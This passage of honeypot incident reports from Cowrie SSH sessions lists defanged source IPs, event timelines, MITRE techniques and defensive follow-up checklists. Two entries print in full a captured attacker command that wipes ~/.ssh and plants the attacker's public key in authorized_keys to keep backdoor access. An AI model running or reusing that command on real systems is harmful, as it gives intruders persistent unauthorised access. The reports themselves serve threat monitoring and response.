|---|---|
| `2026-09-21 12:27:50` | `cowrie.session.connect` |
| `2026-09-21 12:27:50` | `cowrie.client.version` |
| `2026-09-21 12:27:51` | `cowrie.client.kex` |
| `2026-09-21 12:27:51` | `cowrie.login.success` |
| `2026-09-21 12:27:52` | `cowrie.session.params` |
| `2026-09-21 12:27:52` | `cowrie.command.input` |
| `2026-09-21 12:27:52` | `cowrie.command.failed` |
| `2026-09-21 12:27:53` | `cowrie.log.closed` |
| `2026-09-21 12:27:53` | `cowrie.session.params` |
| `2026-09-21 12:27:53` | `cowrie.command.input` |
| `2026-09-21 12:27:54` | `cowrie.session.file_download` |
| `2026-09-21 12:27:54` | `cowrie.log.closed` |
| `2026-09-21 12:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.48[.]241` to AbuseIPDB if not already reported
- [ ] Block `98.70.48[.]241` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a81a410c471a

| Field | Detail |
|---|---|
| **Source IP** | `98.70.48[.]241` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:54` | `cowrie.session.connect` |
| `2026-09-21 12:27:54` | `cowrie.client.version` |
| `2026-09-21 12:27:54` | `cowrie.client.kex` |
| `2026-09-21 12:27:55` | `cowrie.login.success` |
| `2026-09-21 12:27:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.48[.]241` to AbuseIPDB if not already reported
- [ ] Block `98.70.48[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58ce2001f871

| Field | Detail |
|---|---|
| **Source IP** | `98.70.48[.]241` |
| **First Seen** | 2026-09-21 12:27 |
| **Last Seen** | 2026-09-21 12:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:27:55` | `cowrie.session.connect` |
| `2026-09-21 12:27:55` | `cowrie.client.version` |
| `2026-09-21 12:27:55` | `cowrie.client.kex` |
| `2026-09-21 12:27:56` | `cowrie.login.success` |
| `2026-09-21 12:27:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `98.70.48[.]241` to AbuseIPDB if not already reported
- [ ] Block `98.70.48[.]241` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f873d49b3e18

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:26` | `cowrie.session.connect` |
| `2026-09-21 12:28:26` | `cowrie.login.success` |
| `2026-09-21 12:28:27` | `cowrie.session.params` |
| `2026-09-21 12:28:31` | `cowrie.log.closed` |
| `2026-09-21 12:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d34736ab1f97

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:31` | `cowrie.session.connect` |
| `2026-09-21 12:28:31` | `cowrie.login.success` |
| `2026-09-21 12:28:32` | `cowrie.session.params` |
| `2026-09-21 12:28:36` | `cowrie.log.closed` |
| `2026-09-21 12:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1484783431cf

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:32` | `cowrie.session.connect` |
| `2026-09-21 12:28:32` | `cowrie.login.success` |
| `2026-09-21 12:28:32` | `cowrie.session.params` |
| `2026-09-21 12:28:36` | `cowrie.log.closed` |
| `2026-09-21 12:28:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbfe689ea6a

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:36` | `cowrie.session.connect` |
| `2026-09-21 12:28:36` | `cowrie.login.success` |
| `2026-09-21 12:28:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-012053e28562

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:41` | `cowrie.session.connect` |
| `2026-09-21 12:28:41` | `cowrie.login.success` |
| `2026-09-21 12:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c2bc97f43d2

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:41` | `cowrie.session.connect` |
| `2026-09-21 12:28:41` | `cowrie.login.success` |
| `2026-09-21 12:28:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dce50abbf7e1

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:46` | `cowrie.session.connect` |
| `2026-09-21 12:28:46` | `cowrie.login.success` |
| `2026-09-21 12:28:47` | `cowrie.session.params` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:47` | `cowrie.command.failed` |
| `2026-09-21 12:28:47` | `cowrie.command.input` |
| `2026-09-21 12:28:54` | `cowrie.log.closed` |
| `2026-09-21 12:28:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5673b201d16

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:51` | `cowrie.session.connect` |
| `2026-09-21 12:28:51` | `cowrie.login.success` |
| `2026-09-21 12:28:52` | `cowrie.session.params` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:52` | `cowrie.command.failed` |
| `2026-09-21 12:28:52` | `cowrie.command.input` |
| `2026-09-21 12:28:59` | `cowrie.log.closed` |
| `2026-09-21 12:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-743be4221eb0

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:28 |
| **Last Seen** | 2026-09-21 12:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `From: <sip:nm@nm>;tag=root, To: <sip:nm2@nm2>, Call-ID: 50000, CSeq: 42 OPTIONS, Max-Forwards: 70` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:28:52` | `cowrie.session.connect` |
| `2026-09-21 12:28:52` | `cowrie.login.success` |
| `2026-09-21 12:28:53` | `cowrie.session.params` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:53` | `cowrie.command.failed` |
| `2026-09-21 12:28:53` | `cowrie.command.input` |
| `2026-09-21 12:28:59` | `cowrie.log.closed` |
| `2026-09-21 12:28:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87bfb70795b0

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:35` | `cowrie.session.connect` |
| `2026-09-21 12:29:35` | `cowrie.login.success` |
| `2026-09-21 12:29:35` | `cowrie.session.params` |
| `2026-09-21 12:29:40` | `cowrie.log.closed` |
| `2026-09-21 12:29:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd7e9436dcdf

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:40` | `cowrie.session.connect` |
| `2026-09-21 12:29:40` | `cowrie.login.success` |
| `2026-09-21 12:29:40` | `cowrie.session.params` |
| `2026-09-21 12:29:40` | `cowrie.command.input` |
| `2026-09-21 12:29:45` | `cowrie.log.closed` |
| `2026-09-21 12:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7bf24bcefcc7

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:40` | `cowrie.session.connect` |
| `2026-09-21 12:29:41` | `cowrie.login.success` |
| `2026-09-21 12:29:41` | `cowrie.session.params` |
| `2026-09-21 12:29:45` | `cowrie.log.closed` |
| `2026-09-21 12:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b081a22949cd

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:40` | `cowrie.session.connect` |
| `2026-09-21 12:29:41` | `cowrie.login.success` |
| `2026-09-21 12:29:42` | `cowrie.session.params` |
| `2026-09-21 12:29:45` | `cowrie.log.closed` |
| `2026-09-21 12:29:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53167696b1f

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:45` | `cowrie.session.connect` |
| `2026-09-21 12:29:45` | `cowrie.login.success` |
| `2026-09-21 12:29:46` | `cowrie.session.params` |
| `2026-09-21 12:29:46` | `cowrie.command.input` |
| `2026-09-21 12:29:50` | `cowrie.log.closed` |
| `2026-09-21 12:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f68e7b467591

| Field | Detail |
|---|---|
| **Source IP** | `172.236.233[.]65` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:46` | `cowrie.session.connect` |
| `2026-09-21 12:29:46` | `cowrie.login.success` |
| `2026-09-21 12:29:46` | `cowrie.session.params` |
| `2026-09-21 12:29:46` | `cowrie.command.input` |
| `2026-09-21 12:29:50` | `cowrie.log.closed` |
| `2026-09-21 12:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.236.233[.]65` to AbuseIPDB if not already reported
- [ ] Block `172.236.233[.]65` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66585bd062ed

| Field | Detail |
|---|---|
| **Source IP** | `88.26.104[.]155` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:46` | `cowrie.session.connect` |
| `2026-09-21 12:29:46` | `cowrie.client.version` |
| `2026-09-21 12:29:47` | `cowrie.client.kex` |
| `2026-09-21 12:29:47` | `cowrie.login.success` |
| `2026-09-21 12:29:48` | `cowrie.session.params` |
| `2026-09-21 12:29:48` | `cowrie.command.input` |
| `2026-09-21 12:29:48` | `cowrie.command.failed` |
| `2026-09-21 12:29:48` | `cowrie.log.closed` |
| `2026-09-21 12:29:49` | `cowrie.session.params` |
| `2026-09-21 12:29:49` | `cowrie.command.input` |
| `2026-09-21 12:29:49` | `cowrie.session.file_download` |
| `2026-09-21 12:29:49` | `cowrie.log.closed` |
| `2026-09-21 12:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.26.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `88.26.104[.]155` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79850fa146d

| Field | Detail |
|---|---|
| **Source IP** | `88.26.104[.]155` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:49` | `cowrie.session.connect` |
| `2026-09-21 12:29:49` | `cowrie.client.version` |
| `2026-09-21 12:29:49` | `cowrie.client.kex` |
| `2026-09-21 12:29:50` | `cowrie.login.success` |
| `2026-09-21 12:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.26.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `88.26.104[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93090dbf6b79

| Field | Detail |
|---|---|
| **Source IP** | `88.26.104[.]155` |
| **First Seen** | 2026-09-21 12:29 |
| **Last Seen** | 2026-09-21 12:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:29:50` | `cowrie.session.connect` |
| `2026-09-21 12:29:50` | `cowrie.client.version` |
| `2026-09-21 12:29:50` | `cowrie.client.kex` |
| `2026-09-21 12:29:50` | `cowrie.login.success` |
| `2026-09-21 12:29:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `88.26.104[.]155` to AbuseIPDB if not already reported
- [ ] Block `88.26.104[.]155` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcc4bc4bac00

| Field | Detail |
|---|---|
| **Source IP** | `106.75.26[.]244` |
| **First Seen** | 2026-09-21 12:34 |
| **Last Seen** | 2026-09-21 12:34 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:34:34` | `cowrie.session.connect` |
| `2026-09-21 12:34:34` | `cowrie.client.version` |
| `2026-09-21 12:34:34` | `cowrie.client.kex` |
| `2026-09-21 12:34:35` | `cowrie.login.success` |
| `2026-09-21 12:34:37` | `cowrie.session.params` |
| `2026-09-21 12:34:37` | `cowrie.command.input` |
| `2026-09-21 12:34:37` | `cowrie.command.failed` |
| `2026-09-21 12:34:37` | `cowrie.log.closed` |
| `2026-09-21 12:34:38` | `cowrie.session.params` |
| `2026-09-21 12:34:38` | `cowrie.command.input` |
| `2026-09-21 12:34:38` | `cowrie.session.file_download` |
| `2026-09-21 12:34:38` | `cowrie.log.closed` |
| `2026-09-21 12:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.26[.]244` to AbuseIPDB if not already reported
- [ ] Block `106.75.26[.]244` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dc7b20f6ad5

| Field | Detail |
|---|---|
| **Source IP** | `106.75.26[.]244` |
| **First Seen** | 2026-09-21 12:34 |
| **Last Seen** | 2026-09-21 12:34 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:34:38` | `cowrie.session.connect` |
| `2026-09-21 12:34:38` | `cowrie.client.version` |
| `2026-09-21 12:34:39` | `cowrie.client.kex` |
| `2026-09-21 12:34:41` | `cowrie.login.success` |
| `2026-09-21 12:34:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.26[.]244` to AbuseIPDB if not already reported
- [ ] Block `106.75.26[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9d36d56cdca

| Field | Detail |
|---|---|
| **Source IP** | `106.75.26[.]244` |
| **First Seen** | 2026-09-21 12:34 |
| **Last Seen** | 2026-09-21 12:34 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:34:41` | `cowrie.session.connect` |
| `2026-09-21 12:34:41` | `cowrie.client.version` |
| `2026-09-21 12:34:42` | `cowrie.client.kex` |
| `2026-09-21 12:34:43` | `cowrie.login.success` |
| `2026-09-21 12:34:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.75.26[.]244` to AbuseIPDB if not already reported
- [ ] Block `106.75.26[.]244` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9476cc61046b

| Field | Detail |
|---|---|
| **Source IP** | `193.112.192[.]91` |
| **First Seen** | 2026-09-21 12:37 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 12:37:02` | `cowrie.session.connect` |
| `2026-09-21 12:37:02` | `cowrie.client.version` |
| `2026-09-21 12:37:03` | `cowrie.client.kex` |
| `2026-09-21 12:37:04` | `cowrie.login.success` |
| `2026-09-21 12:42:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.112.192[.]91` to AbuseIPDB if not already reported
- [ ] Block `193.112.192[.]91` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fc8c236dd01

| Field | Detail |
|---|---|
| **Source IP** | `50.114.236[.]21` |
| **First Seen** | 2026-09-21 12:42 |
| **Last Seen** | 2026-09-21 12:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
